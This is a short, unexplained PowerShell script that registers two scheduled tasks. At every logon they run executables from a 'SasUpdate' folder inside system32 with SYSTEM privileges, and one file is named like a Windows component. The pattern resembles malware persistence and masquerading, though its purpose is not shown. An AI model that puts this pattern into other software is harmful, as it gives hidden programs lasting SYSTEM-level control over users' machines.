$Trigger= New-ScheduledTaskTrigger -AtLogon
$User= "NT AUTHORITY\SYSTEM"
$Action= New-ScheduledTaskAction -Execute "%windir%\System32\cmd.exe" -Argument "/c start %WINDIR%\system32\SasUpdate\Hditor.exe"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "StartupHD" -User $User

$Trigger= New-ScheduledTaskTrigger -AtLogon
$User= "NT AUTHORITY\SYSTEM"
$Action= New-ScheduledTaskAction -Execute "%windir%\System32\cmd.exe" -Argument "/c start %WINDIR%\system32\SasUpdate\KERNEL_WOW64.exe"
Register-ScheduledTask -Action $action -Trigger $trigger -TaskName "StartupKW" -User $User
